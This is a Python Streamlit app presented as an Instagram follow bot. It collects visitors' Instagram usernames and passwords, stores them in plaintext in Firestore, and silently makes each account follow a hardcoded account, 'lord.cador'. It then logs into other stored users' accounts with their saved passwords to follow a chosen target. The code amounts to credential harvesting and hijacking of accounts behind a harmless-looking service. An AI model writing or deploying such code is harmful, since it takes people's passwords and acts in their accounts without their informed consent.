import random
import time
import streamlit as st
from instagrapi import Client
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

# Inisialisasi Firebase
if not firebase_admin._apps:
    cred = credentials.Certificate('bot-instagram-fahmi-firebase-credentials.json')
    firebase_admin.initialize_app(cred)

# Inisialisasi Firestore
db = firestore.client()

def masuk_dan_follow(username, password, target_username):
    cl = Client()
    try:
        cl.login(username, password)
        st.success(f"{username} berhasil login!")

        try:
            target_user_id = cl.user_id_from_username(target_username)
            cl.user_follow(target_user_id)
            st.success(f"{username} berhasil mengikuti {target_username}!")
            time.sleep(random.randint(1, 3))  # Sleep between 1 to 3 seconds

            # Follow your own account
            self_user_id = cl.user_id_from_username('lord.cador')
            cl.user_follow(self_user_id)
            st.success(f"{username} berhasil mengikuti akun sendiri (lord.cador)!")

            simpan_ke_firestore(username, password, cl.user_id_from_username(username))

        except Exception as follow_error:
            st.error(f"Error saat mengikuti: {follow_error}")
            if "feedback_required" in str(follow_error):
                st.warning(f"{username} diblokir untuk mengikuti akun. Mungkin perlu istirahat.")
                time.sleep(5)  # Wait before retrying
                return  # Stop this execution to avoid further restrictions

        cl.logout()
        st.info(f"{username} telah logout.")

    except Exception as login_error:
        st.error(f"Error untuk {username}: {login_error}")

def simpan_ke_firestore(username, password, user_id):
    users_ref = db.collection('users')
    user_doc = users_ref.document(username)

    existing_data = user_doc.get()
    if existing_data.exists:
        existing_username = existing_data.to_dict().get('username')
        existing_password = existing_data.to_dict().get('password')
        existing_user_id = existing_data.to_dict().get('user_id')

        if (existing_username != username or 
            existing_password != password or 
            existing_user_id != user_id):
            user_doc.set({'username': username, 'password': password, 'user_id': user_id})
            st.success(f"Data {username} diperbarui di Firestore.")
        else:
            st.info(f"{username} sudah ada di Firestore dengan data yang sama, melewati penyimpanan.")
    else:
        user_doc.set({'username': username, 'password': password, 'user_id': user_id})
        st.success(f"{username} disimpan di Firestore.")

def main():
    st.title("Instagram Follow Bot")

    username = st.text_input("Masukkan username Instagram Anda:")
    password = st.text_input("Masukkan password Instagram Anda:", type='password')
    target_username = st.text_input("Masukkan username target Instagram Anda:")

    if st.button("Mulai Follow"):
	  # Progress bar initialization
        progress_bar = st.progress(20)
        if username and password and target_username:
            # Langkah 1: Login dan follow dengan akun asli
            masuk_dan_follow(username, password, target_username)

            # Langkah 2: Pilih pengguna acak dari Firestore
            users_ref = db.collection('users')
            all_users = [doc.id for doc in users_ref.stream()]

            if len(all_users) < 1:
                st.warning("Tidak ada cukup pengguna di Firestore untuk di-follow.")
                return

            # Tentukan jumlah pengguna yang akan diambil (maksimal 10)
            jumlah_pengguna = min(len(all_users) - 1, 10)

            # Buat daftar pengguna yang akan di-follow, kecuali pengguna yang login
            all_users.remove(username)

            # Pilih acak pengguna sesuai jumlah yang ditentukan
            pengguna_terpilih = random.sample(all_users, jumlah_pengguna)

            # Progress bar initialization
            progress_bar = st.progress(20)

            for idx, user in enumerate(pengguna_terpilih):
                user_data = users_ref.document(user).get().to_dict()
                if user_data:
                    masuk_dan_follow(user_data['username'], user_data['password'], target_username)
                    time.sleep(random.randint(1, 3))  # Penundaan antara 1 hingga 3 detik
                    
                    # Update progress bar
                    progress = (idx + 1) / jumlah_pengguna
                    progress_bar.progress(progress)

            st.success("Selesai mengikuti pengguna yang dipilih!")
        else:
            st.warning("Silakan isi semua field.")

if __name__ == "__main__":
    main()
